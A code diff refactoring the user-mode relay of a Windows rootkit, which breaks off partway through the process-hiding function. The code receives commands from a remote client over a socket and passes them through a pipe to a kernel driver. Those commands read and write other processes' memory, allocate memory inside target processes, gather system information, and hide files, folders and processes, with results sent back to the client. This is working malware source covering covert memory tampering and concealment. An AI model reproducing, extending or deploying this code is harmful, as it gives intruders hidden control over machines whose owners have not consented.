@@ -1,9 +1,11 @@
-#include "rootreqs.h"
+#include "requests.h"
 #pragma warning(disable : 4244)
+#define MEDIUM_AS_SOURCE_MODULE "mymyymym"
 
 
+// Legacy code, not used anymore
 template<typename ... Arg>
-uint64_t CallHook(const Arg ... args) {
+ULONG64 CallHook(const Arg ... args) {
 	printf("Loading user32.dll ..\n");
 	if (LoadLibraryA("user32.dll") == NULL) {
 		printf("Cannot call the function - user32.dll is not loaded!\n");
@@ -40,14 +42,14 @@ uint64_t CallHook(const Arg ... args) {
 }
 
 
-int CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HANDLE* PipeHandle, LogFile* MediumLog) {
+int DriverCalls::CallKernelDriver(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HANDLE* PipeHandle, LogFile* MediumLog) {
 	/*
 	if(CallHook(RootkInst) == NULL){
 		printf("CallKernelDriver failed - CallHook() returned NULL!\n");
 		return FALSE;
 	}
 	*/
-
+	PASS_DATA SocketResult = { 0 };
 	DWORD LastError = WritePipe(PipeHandle, (PVOID)RootkInst, sizeof(ROOTKIT_MEMORY), MediumLog);
 	if (LastError != 0) {
 		return -1;
@@ -59,70 +61,57 @@ int CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HA
 	}
 
 	if (PassBack) {
-		PASS_DATA result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
-		if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
-			MediumLog->WriteLog((PVOID)"CallKernelDriver failed - cannot return results from driver back to client!\n", 77);
+		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
+		if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
+			LogMessage("CallKernelDriver failed - cannot return results from driver back to client!\n", MediumLog, TRUE, GetLastError());
 			return 0;
 		}
 	}
-	printf("CallKernelDriver success!\n");
+	LogMessage("CallKernelDriver success!\n", MediumLog, FALSE, 0);
 	return 1;
 }
 
 
-int InitialKernelCall(HANDLE* PipeHandle, LogFile* MediumLog) {
-	ROOTKIT_MEMORY InitData = { 0 };
-	InitData.MedPID = (ULONG64)GetCurrentProcessId();
-	InitData.MainPID = (ULONG64)GetPID("meow_client.exe");
-	InitData.SemiPID = (ULONG64)GetPID("powershell.exe");
-	if (InitData.SemiPID == NULL || InitData.MainPID == NULL) {
-		return 0;
-	}
-	return CallKernelDriver(NULL, &InitData, FALSE, PipeHandle, MediumLog);
-}
-
-
-int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog) {
-	PASS_DATA result;
+int DriverCalls::WriteKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA SocketResult = { 0 };
 	ULONG64 SrcPID = 0;
 	ULONG64 DstPID = 0;
 	PVOID LocalWrite = NULL;
 	PVOID WriteToMdl = NULL;
-	const char* MagicMdl = "mymyymym";
 	char MdlMalloc = 1;
 	ULONG WriteToMdlSize = 0;
 	SIZE_T AllocSize = 0;
 	ROOTKIT_UNEXERR Err = successful;
 	SYSTEM_INFO LocalSysInfo = { 0 };
 
-	// Get secondary module string (writing destination) -
-	result = root_internet::RecvData(tosock, sizeof(WriteToMdlSize), &WriteToMdlSize, FALSE, 0);
-	if (result.err || result.value != sizeof(WriteToMdlSize)) {
+	// Get secondary module string (writing destination):
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(WriteToMdlSize), &WriteToMdlSize, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(WriteToMdlSize)) {
 		return 0;
 	}
 
 	WriteToMdl = malloc(WriteToMdlSize);
 	if (WriteToMdl == NULL) {
 		MdlMalloc = 0;
-		root_internet::SendData(tosock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
+		root_internet::SendData(ClientToServerSocket, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);
 		return  0;
 	}
-	result = root_internet::SendData(tosock, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0);
-	if (result.err || result.value != sizeof(MdlMalloc)) {
+	SocketResult = root_internet::SendData(ClientToServerSocket, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(MdlMalloc)) {
 		free(WriteToMdl);
 		return 0;
 	}
 
-	result = root_internet::RecvData(tosock, WriteToMdlSize, WriteToMdl, FALSE, 0);
-	if (result.err || result.value != WriteToMdlSize) {
+	SocketResult = root_internet::RecvData(ClientToServerSocket, WriteToMdlSize, WriteToMdl, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != WriteToMdlSize) {
 		free(WriteToMdl);
 		return 0;
 	}
 
 
-	// Get main structure with parameters for the operation -
-	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	// Get main structure with parameters for the operation:
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		free(WriteToMdl);
 		return 0;
 	}
@@ -131,20 +120,20 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 	GetSystemInfo(&LocalSysInfo);
 	AllocSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);
 
-	// if writing is from a user-supplied buffer receive the buffer -
+	// if writing is from a user-supplied buffer receive the buffer:
 	if (Err == successful) {
 		if (strcmp(RootkInst->MdlName, "regular") == 0) {
 			RootkInst->Status = (NTSTATUS)REGULAR_BUFFER;
 			LocalWrite = malloc(AllocSize);
 			if (!LocalWrite) {
-				printf("Cannot allocate buffer for writing locally\n");
+				LogMessage("Cannot allocate buffer for writing locally\n", MediumLog, TRUE, GetLastError());
 				free(WriteToMdl);
 				Err = memalloc;
 			}
 			else {
-				result = root_internet::RecvData(tosock, (int)RootkInst->Size, LocalWrite, FALSE, 0);
-				if (result.err || result.value != RootkInst->Size) {
-					printf("Cannot get write value\n");
+				SocketResult = root_internet::RecvData(ClientToServerSocket, (int)RootkInst->Size, LocalWrite, FALSE, 0, MediumLog);
+				if (SocketResult.err || SocketResult.value != RootkInst->Size) {
+					LogMessage("Cannot get write value\n", MediumLog, TRUE, GetLastError());
 					free(LocalWrite);
 					free(WriteToMdl);
 					return FALSE;
@@ -157,8 +146,8 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 
 	if (Err == successful) {
 
-		// Writing source module PID -
-		if (strcmp(RootkInst->MdlName, MagicMdl) == 0 || strcmp(RootkInst->MdlName, "regular") == 0) {
+		// Writing source module PID:
+		if (strcmp(RootkInst->MdlName, MEDIUM_AS_SOURCE_MODULE) == 0 || strcmp(RootkInst->MdlName, "regular") == 0) {
 			SrcPID = (ULONG64)GetCurrentProcessId();
 		}
 		else {
@@ -170,9 +159,9 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 			Err = relevantpid;
 		}
 
-		// Writing destination module PID -
+		// Writing destination module PID:
 		if (Err == successful) {
-			if (strcmp(RootkInst->DstMdlName, MagicMdl) == 0) {
+			if (strcmp(RootkInst->DstMdlName, MEDIUM_AS_SOURCE_MODULE) == 0) {
 				DstPID = (ULONG64)GetCurrentProcessId();
 			}
 
@@ -188,19 +177,19 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 	}
 	
 
-	// Pass arguments, perform the operation and return the results to the client -
+	// Pass arguments, perform the operation and return the results to the client:
 	RootkInst->Unexpected = Err;
 	if (Err == successful) {
 		RootkInst->MainPID = DstPID;
 		RootkInst->SemiPID = SrcPID;
 		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 		RootkInst->IsFlexible = TRUE;
-		int DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+		int DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
-			printf("transformation of regular data from KM-UM confirmed!\n");
+			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
 		}
 		else {
-			printf("transformation of regular data from KM-UM not working correctly!!!\n");
+			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
 		}
 
 		free(LocalWrite);
@@ -208,17 +197,16 @@ int WriteKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr
 		return DriverRes;
 	}
 	else {
-		result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
 		return 0;
 	}
 }
 
 
-int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
-	PASS_DATA result;
+int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA SocketResult = { 0 };
 	ULONG64 PrcID = 0;
 	ULONG64 DstID = 0;
-	const char* MagicMdl = "mymyymym";
 	ROOTKIT_UNEXERR Err = successful;
 	int KrnlRes = 0;
 	SIZE_T AllocSize = 0;
@@ -226,9 +214,9 @@ int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, ch
 	SYSTEM_INFO LocalSysInfo = { 0 };
 
 
-	// Receive the main structure with the parameters for the operation -
-	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	// Receive the main structure with the parameters for the operation:
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		return 0;
 	}
 
@@ -241,7 +229,7 @@ int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, ch
 	}
 
 
-	// Configure reading source and destination PIDs -
+	// Configure reading source and destination PIDs:
 	if (Err == successful) {
 		DstID = (ULONG64)GetCurrentProcessId();
 		if (DstID == NULL) {
@@ -249,7 +237,7 @@ int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, ch
 		}
 
 		if (Err == successful) {
-			if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
+			if (strcmp(RootkInst->MdlName, MEDIUM_AS_SOURCE_MODULE) == 0) {
 				PrcID = (ULONG64)GetCurrentProcessId();
 			}
 			else {
@@ -263,61 +251,60 @@ int ReadKernelCall(SOCKET tosock, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, ch
 	}
 
 	if (Err == successful) {
-		// Pass arguments and perform the operation -
+		// Pass arguments and perform the operation:
 		RootkInst->Out = LocalRead;
 		RootkInst->MainPID = PrcID;
 		RootkInst->SemiPID = DstID;
 		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 		RootkInst->IsFlexible = TRUE;
-		KrnlRes = CallKernelDriver(tosock, RootkInst, FALSE, PipeHandle, MediumLog);
+		KrnlRes = CallKernelDriver(ClientToServerSocket, RootkInst, FALSE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
-			printf("transformation of regular data from KM-UM confirmed!\n");
+			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
 		}
 		else {
-			printf("transformation of regular data from KM-UM not working correctly!!!\n");
+			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
 		}
 	}
 
 
-	// Return the results of the operation to the client -
+	// Return the results of the operation to the client:
 	if (Err == successful && KrnlRes == 1) {
-		result = root_internet::SendData(tosock, LocalRead, (int)RootkInst->Size, FALSE, 0);
-		if (result.err || result.value != (int)RootkInst->Size) {
+		SocketResult = root_internet::SendData(ClientToServerSocket, LocalRead, (int)RootkInst->Size, FALSE, 0, MediumLog);
+		if (SocketResult.err || SocketResult.value != (int)RootkInst->Size) {
 			return 0;
 		}
 	}
 
 	else {
-		result = root_internet::SendData(tosock, &FailedValue, sizeof(FailedValue), FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedValue, sizeof(FailedValue), FALSE, 0, MediumLog);
 		return KrnlRes;
 	}
 
 	RootkInst->Unexpected = successful;
-	result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		return 0;
 	}
 	return 1;
 }
 
 
-int MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
-	PASS_DATA result;
-	const char* MagicMdl = "mymyymym";
+int DriverCalls::MdlBaseKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA SocketResult = { 0 };
 	ULONG64 PID = 0;
 	int DriverRes = FALSE;
 
 
-	// Receive the main structure with the parameters for the operation -
-	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	// Receive the main structure with the parameters for the operation:
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		return 0;
 	}
 	RootkInst->MdlName = ModuleName;
 
 
-	// Get module PID -
-	if (strcmp(RootkInst->MdlName, MagicMdl) == 0) {
+	// Get module PID:
+	if (strcmp(RootkInst->MdlName, MEDIUM_AS_SOURCE_MODULE) == 0) {
 		PID = (ULONG64)GetCurrentProcessId();
 	}
 	else {
@@ -325,31 +312,31 @@ int MdlBaseKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName
 	}
 
 	if (PID != NULL) {
-		// Pass the arguments to the driver, perform the operation and return the results back to the client -
 
+		// Pass the arguments to the driver, perform the operation and return the results back to the client:
 		RootkInst->Unexpected = successful;
 		RootkInst->MainPID = PID;
 		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 		RootkInst->IsFlexible = TRUE;
-		DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+		DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
-			printf("transformation of regular data from KM-UM confirmed!\n");
+			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
 		}
 		else {
-			printf("transformation of regular data from KM-UM not working correctly!!!\n");
+			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
 		}
 		return DriverRes;
 	}
 	else {
 		RootkInst->Unexpected = relevantpid;
-		result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
 		return 0;
 	}
 }
 
 
-int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize, HANDLE* PipeHandle, LogFile* MediumLog) {
-	PASS_DATA result;
+int DriverCalls::SysInfoKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA SocketResult = { 0 };
 	PVOID SysDataBuffer = NULL;
 	ULONG64 TotalSize = 0;
 	ULONG FailedSize = 12323;
@@ -357,9 +344,9 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 	int KrnlRes = FALSE;
 
 
-	// Receive the main structure with the parameters for the operation -
-	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	// Receive the main structure with the parameters for the operation:
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		Err = receivedata;
 	}
 	else {
@@ -367,14 +354,14 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 	}
 
 
-	// Handling initial unexpected errors -
+	// Handling initial unexpected errors:
 	if (Err != successful) {
 		RootkInst->Unexpected = Err;
-		result = root_internet::SendData(tosock, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
 		return 0;
 	}
 
-	// Pass the arguments for the request of system information -
+	// Pass the arguments for the request of system information:
 	RootkInst->Unexpected = successful;
 	RootkInst->Operation = RKOP_SYSINFO;
 	RootkInst->Buffer = AttrBuffer;
@@ -382,64 +369,64 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 	RootkInst->Size = AttrBufferSize;
 	RootkInst->IsFlexible = TRUE;
-	KrnlRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+	KrnlRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 	if (!RootkInst->IsFlexible) {
-		printf("transformation of regular data from KM-UM confirmed!\n");
+		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
 	}
 	else {
-		printf("transformation of regular data from KM-UM not working correctly!!!\n");
+		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
 	}
 
 
-	// Return the actual buffer with system information to the client -
+	// Return the actual buffer with system information to the client:
 	if (KrnlRes == 1) {
 		TotalSize = RootkInst->Size;
 		SysDataBuffer = RootkInst->Out;
-		result = root_internet::SendData(tosock, &TotalSize, sizeof(TotalSize), FALSE, 0);
-		if (result.err || result.value != sizeof(TotalSize)) {
+		SocketResult = root_internet::SendData(ClientToServerSocket, &TotalSize, sizeof(TotalSize), FALSE, 0, MediumLog);
+		if (SocketResult.err || SocketResult.value != sizeof(TotalSize)) {
 			VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
 			return 0;
 		}
 
-		result = root_internet::SendData(tosock, SysDataBuffer, (int)TotalSize, FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, SysDataBuffer, (int)TotalSize, FALSE, 0, MediumLog);
 		VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
-		if (result.err || result.value != (int)TotalSize) {
+		if (SocketResult.err || SocketResult.value != (int)TotalSize) {
 			return 0;
 		}
 
 
 		// Send back updated attribute buffer:
-		result = root_internet::SendData(tosock, AttrBuffer, (int)AttrBufferSize, FALSE, 0);
-		if (result.err || result.value != AttrBufferSize) {
+		SocketResult = root_internet::SendData(ClientToServerSocket, AttrBuffer, (int)AttrBufferSize, FALSE, 0, MediumLog);
+		if (SocketResult.err || SocketResult.value != AttrBufferSize) {
 			return 0;
 		}
 		return 1;
 	}
 
 	else {
-		result = root_internet::SendData(tosock, &FailedSize, sizeof(FailedSize), FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedSize, sizeof(FailedSize), FALSE, 0, MediumLog);
 		return KrnlRes;
 	}
 }
 
 
-int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog){
-	PASS_DATA result;
+int DriverCalls::AllocSpecKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog){
+	PASS_DATA SocketResult = { 0 };
 	ULONG64 PID = 0;
 	int DriverRes = FALSE;
 	PVOID InitAddr = NULL;
 	char FailedSize = 1;
 
 
-	// Receive the main structure with the parameters for the operation -
-	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	// Receive the main structure with the parameters for the operation:
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		return 0;
 	}
 
 
-	// Get PID of the process allocating memory into -
-	if (strcmp(ModuleName, "mymyymym") == 0) {
+	// Get PID of the process allocating memory into:
+	if (strcmp(ModuleName, MEDIUM_AS_SOURCE_MODULE) == 0) {
 		PID = (ULONG64)GetCurrentProcessId();
 	}
 	else {
@@ -447,18 +434,18 @@ int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNa
 	}
 
 
-	// Pass arguments to the driver, perform the operation and return the results back to the client -
+	// Pass arguments to the driver, perform the operation and return the results back to the client:
 	if (PID != NULL) {
 		RootkInst->Unexpected = successful;
 		RootkInst->MdlName = ModuleName;
 		RootkInst->MainPID = PID;
 		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
-		DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+		DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 		if (!RootkInst->IsFlexible) {
-			printf("transformation of regular data from KM-UM confirmed!\n");
+			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
 		}
 		else {
-			printf("transformation of regular data from KM-UM not working correctly!!!\n");
+			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
 		}
 
 		if (RootkInst->Buffer == RootkInst->Out) {
@@ -470,7 +457,7 @@ int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNa
 		return DriverRes;
 	}
 	else {
-		result = root_internet::SendData(tosock, &FailedSize, sizeof(FailedSize), FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedSize, sizeof(FailedSize), FALSE, 0, MediumLog);
 		return 0;
 	}
 }
@@ -478,8 +465,8 @@ int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNa
 
 
 
-int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
-	PASS_DATA result;
+int DriverCalls::HideFileKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA SocketResult = { 0 };
 	int DriverRes = FALSE;
 	PVOID InitAddr = NULL;
 	char FailedSize = 1;
@@ -490,24 +477,24 @@ int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNam
 
 
 	// Receive the request status to verify if other preperations are needed:
-	result = root_internet::RecvData(tosock, sizeof(NTSTATUS), &RequestStatus, FALSE, 0);
-	if (result.err || result.value != sizeof(NTSTATUS)) {
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
 		return 0;
 	}
 	if (RequestStatus == HIDE_FILEFOLDER) {
-		result = root_internet::RecvData(tosock, sizeof(DWORD), &FilePathLength, FALSE, 0);
-		if (result.err || result.value != sizeof(DWORD)) {
+		SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(DWORD), &FilePathLength, FALSE, 0, MediumLog);
+		if (SocketResult.err || SocketResult.value != sizeof(DWORD)) {
 			return 0;
 		}
-		result = root_internet::RecvData(tosock, FilePathLength, FilePath, FALSE, 0);
-		if (result.err || result.value != FilePathLength) {
+		SocketResult = root_internet::RecvData(ClientToServerSocket, FilePathLength, FilePath, FALSE, 0, MediumLog);
+		if (SocketResult.err || SocketResult.value != FilePathLength) {
 			return 0;
 		}
 	}
 
 	// Receive the main structure with the parameters for the operation:
-	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		return 0;
 	}
 
@@ -527,20 +514,20 @@ int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNam
 	RootkInst->MdlName = ModuleName;
 	RootkInst->MainPID = (ULONG64)GetCurrentProcessId();
 	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
-	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+	DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 	if (!RootkInst->IsFlexible) {
-		printf("transformation of regular data from KM-UM confirmed!\n");
+		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
 	}
 	else {
-		printf("transformation of regular data from KM-UM not working correctly!!!\n");
+		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
 	}
 
 
 	// Parse returned data correctly (after sending back main struct):
 	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_FILEFOLDER && RootkInst->Size != 0) {
-		result = root_internet::SendData(tosock, RootkInst->Out, (int)RootkInst->Size, FALSE, 0);
+		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, (int)RootkInst->Size, FALSE, 0, MediumLog);
 		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
-		if (result.err || result.value != RootkInst->Size) {
+		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
 			return 0;
 		}
 	}
@@ -550,8 +537,8 @@ int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNam
 
 
 
-int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
-	PASS_DATA result;
+int DriverCalls::HideProcessKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA SocketResult = { 0 };
 	int DriverRes = FALSE;
 	PVOID InitAddr = NULL;
 	char FailedSize = 1;
@@ -559,23 +546,23 @@ int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* Module
 	PVOID DummyAddress = NULL;
 
 
-	// Receive the request status to verify if other preperations are needed (ADD PREOPERATIONS HERE IF NEEDED):
-	result = root_internet::RecvData(tosock, sizeof(NTSTATUS), &RequestStatus, FALSE, 0);
-	if (result.err || result.value != sizeof(NTSTATUS)) {
+	// Receive the request status to verify if other preperations are needed (add preoperations if needed):
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
 		return 0;
 	}
 
 
 	// Receive the main structure with the parameters for the operation:
-	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
-	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
+	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
 		return 0;
 	}
 
 
 	// Set important arguments and verify parameters before sending to driver:
 	if (RequestStatus == SHOWHIDDEN_PROCESS) {
-		RootkInst->Out = &DummyAddress;
+		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ports
 	}
 
 
@@ -583,20 +570,74 @@ int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* Module
 	RootkInst->Unexpected = successful;
